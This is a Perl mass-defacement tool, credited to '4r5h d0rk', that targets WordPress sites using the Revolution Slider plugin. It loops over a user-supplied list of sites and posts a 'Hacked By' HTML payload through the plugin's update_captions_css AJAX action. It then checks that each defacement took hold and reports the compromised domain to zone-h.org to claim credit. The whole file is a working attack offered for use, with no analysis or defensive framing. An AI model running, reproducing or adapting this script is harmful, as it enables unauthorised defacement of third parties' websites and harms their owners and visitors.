#!/usr/bin/perl

#mass revslider defacer recoded by 4r5h d0rk INDIAN CYBER HERO'S
# 4r5h d0rk ©

use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)");
$ua->timeout (10);

print " 
#######################################
##==============[+][+]===============##
## ######   |  ######   |  ##    ##  ##
## ######   |  ######   |  ##    ##  ##
##   ##     |  ##       |  ##    ##  ##
##   ##     |  ##       |  ########  ##
##   ##     |  ##       |  ##    ##  ##
## ######   |  ######   |  ##    ##  ##
## ######   |  ######   |  ##    ##  ##
##==============[-][-]===============##
##+++++===[Rev_Slider_Defacer]===++++##
##-------====[By:4r5h d0rk]====------##
##====[Special_design:: H4M4573R]====##
#######################################  

\n";

print "[+]Path of your target list:";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Can't open the Website list !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

foreach $site(@TARGETS){

chomp $site;
if($site !~ /http:\/\//) { $site = "http://$site/"; };

$ajx = $site . 'wp-admin/admin-ajax.php';

$link = $site .'wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

print "Scaning  $site\n";

$gassface = POST $ajx, [
'action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"
<body style='color: transparent;background-color: black'>
<center><h1><b style='color: white'><center>Hacked By 4r5h d0rk<br>Indian Cyber Heros<p style='color: transparent'>"];
$response = $ua->request($gassface);
$stat = $response->content;
	if ($stat =~ /true/){
print colored ("[+]Exploit Success!!",'white on_red'),"\n";
print "[+]$link\n[+]Wait Zone-H...\n";
zonpost();
}else{
print colored ("[-]Exploit Failed!!",'white on_blue'),"\n";
}
}
sub zonpost{
$req = HTTP::Request->new(GET=>$link);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($req);
$ar = $response->content;
if ($ar =~ /Hacked|4r5h d0rk |ICH/){

				$dmn= $link;
				$def="4r5h d0rk";
				$zn="http://zone-h.org/notify/single";
				$lwp=LWP::UserAgent->new;
				$res=$lwp  -> post($zn,[
				'defacer'     => $def,
				'domain1'   => $dmn,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print colored ("[-]submit $1",'white on_green'),"\n";
				}
				else
				{
				print colored ("[-]Error",'black on_white'),"\n";
				}
				     }else{
						print" Not Defaced Frand !! \n";
}
}